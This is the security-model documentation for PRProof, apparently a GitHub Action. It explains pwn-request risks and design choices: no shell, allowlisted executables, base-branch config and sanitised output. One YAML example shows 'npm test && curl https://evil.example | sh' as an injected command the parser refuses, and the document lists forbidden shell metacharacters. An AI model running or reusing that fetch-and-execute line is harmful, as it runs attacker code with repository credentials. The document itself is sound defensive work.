# Security model

PRProof runs in CI, reads a pull request written by someone who may have no write access to the
repository, and then writes to that repository. This document describes what it does with that
position, what it refuses to do, and where the limits are.

If you find a problem with any of it, please read [SECURITY.md](../SECURITY.md) before opening a
public issue.

## The threat

The attack that matters here is the one usually called a _pwn request_.

A workflow triggered by `pull_request_target` (or `workflow_run`) runs with the base
repository's `GITHUB_TOKEN`, its secrets, and write access. If such a workflow checks out the
pull request's head and executes anything from it — a build script, a test command, a
`postinstall` hook — an attacker who can open a pull request can run code with your
repository's credentials. This has caused real supply-chain compromises, and GitHub now blocks
the most common form of it: since `actions/checkout` v7 (June 2026, backported and enforced
from 20 July 2026), checking out a fork's head or merge ref under `pull_request_target` fails
unless you explicitly opt in with `allow-unsafe-pr-checkout`.

PRProof adds a second attack surface of its own: a configuration file that can name commands to
execute. The design below exists to make that surface as small as it can be.

## Seven decisions

### 1. The default mode executes nothing

In `mode: checks` — the default — PRProof runs no commands. It reads outcomes that already
exist: step outcomes handed in through action inputs, or check runs published for the head
commit. There is no code execution surface to attack.

### 2. Configuration comes from the base branch

The action reads `.prproof.yml` through the GitHub API at the pull request's **base** SHA, not
from the checked-out workspace. A contributor therefore cannot change the rules their own pull
request is judged by, and — critically — cannot introduce a command for `mode: run` to execute.

If the pull request modifies `.prproof.yml`, the report says so explicitly, and still uses the
base version.

`config-source: head` exists for repositories where every contributor already has write access.
It logs a warning and adds a note to the report. Do not use it on a public repository.

### 3. There is no shell

Commands are tokenised into `argv` in [`src/adapters/exec/command.ts`](../src/adapters/exec/command.ts)
and spawned with `shell: false`. Any of `; & | \` $ ( ) { } < > ! \\` or a newline in a command
is a **parse error**, not something to escape:

```yaml
test:
  command: npm test && curl https://evil.example | sh # refused: contains ';', '&', '|'
```

The reasoning is that a command which could not have been an injection is safer than one that
has been made safe after the fact. Simple quoting is supported so `pytest -k "my slow test"`
works; a forbidden character inside quotes is still forbidden.

If you genuinely need composition, write a script in your repository and call it — the script
lives on the base branch and is reviewed like any other code.

### 4. Only known executables start

`argv[0]` must be on `run.allowed_commands`, which defaults to a short list of build-tool
front-ends (`npm`, `pnpm`, `pytest`, `go`, `cargo`, `make`, …). No shells are on it. Extending
the list is possible — from the base branch only.

### 5. Execution is refused in privileged contexts

`assertSafeExecutionContext` refuses to start any process when the event is
`pull_request_target`, `workflow_run`, `workflow_dispatch`, `schedule`, `repository_dispatch`
or `issue_comment`. There is no override input. If you want commands executed, they run in the
unprivileged `pull_request` job, where the token is read-only and no secrets are present.

A refused command is reported as **unknown**, not as a failure: a misconfiguration must not look
like a broken build.

### 6. The privileged job reads data, never code

The reporting action (`theimdall/prproof/report@v0.1.1`) runs on `workflow_run` with
`pull-requests: write` and `checks: write`. It:

- never checks out any repository,
- never executes anything,
- downloads exactly one JSON artifact,
- re-validates every field of it against a strict schema — unknown fields dropped, strings
  truncated, numbers clamped, the score band recomputed rather than trusted,
- verifies through the API that the pull request it is about to comment on currently points at
  the same head SHA as the workflow run that produced the artifact,
- re-renders the markdown itself, so the analysis job never chooses the markup that gets posted.

The artifact is treated as untrusted input even though PRProof wrote it: in `mode: run` the
analysis job also executed repository code, and "we produced this file" is not a security
property.

### 7. Untrusted text cannot reshape the report

Everything that originates outside PRProof — pull request titles, branch names, dependency
names read out of a diff, command output — passes through
[`src/core/render/sanitize.ts`](../src/core/render/sanitize.ts):

| Risk                                         | Mitigation                                                  |
| -------------------------------------------- | ----------------------------------------------------------- |
| Forging PRProof's sticky-comment marker      | HTML comments stripped from untrusted text                  |
| Raw HTML in the comment                      | `<` and `>` escaped                                         |
| Notification spam and false cross-references | `@mention` and `#123` defused with a zero-width space       |
| Breaking the markdown table                  | `\|` escaped in table cells                                 |
| Comment size abuse                           | every field length-capped; body capped at 60 000 characters |
| Credentials in command output                | token-shaped strings redacted before anything is printed    |
| YAML alias bombs in `.prproof.yml`           | anchors rejected (`maxAliasCount: 0`), file capped at 64 KB |

The sticky comment updater additionally only ever edits a comment authored by a **bot** — a
human comment containing the marker is never touched.

## Permissions

Ask for the least that works:

```yaml
# analysis (unprivileged)
permissions:
  contents: read

# reporting (privileged, separate workflow)
permissions:
  pull-requests: write
  checks: write
```

`contents: write`, `actions: write` and `id-token: write` are never needed by PRProof.

## Pinning

For a public repository, pin the action to a commit SHA — a tag can be moved:

```yaml
- uses: theimdall/prproof@<40-character-sha> # v1.x
```

## What PRProof does not protect you from

Stated plainly, because a security model that only lists strengths is marketing:

- **A workflow that is already unsafe.** If your own workflow checks out fork code under
  `pull_request_target` and runs `npm ci` with secrets in the environment, PRProof cannot help.
  That is the attack; PRProof simply does not add to it.
- **`mode: run` is not risk-free.** It is a much smaller surface than a privileged checkout —
  no secrets, read-only token, no shell, allowlisted executables, base-branch configuration —
  but it does start a process on behalf of a pull request. If that matters to you, the default
  mode never does.
- **Malicious dependencies.** PRProof tells you a dependency was added. It does not audit it.
- **A compromised base branch.** Anyone who can write to the base branch can already do
  everything PRProof could be persuaded to do, and more.
- **Environment scrubbing is defence in depth, not a boundary.** Variables matching
  credential-shaped names and all `INPUT_*` / `ACTIONS_*` variables are removed before a
  subprocess starts, but the real protection is that the job has no secrets to begin with.

## Reporting a vulnerability

See [SECURITY.md](../SECURITY.md). Please do not open a public issue for a suspected
vulnerability.
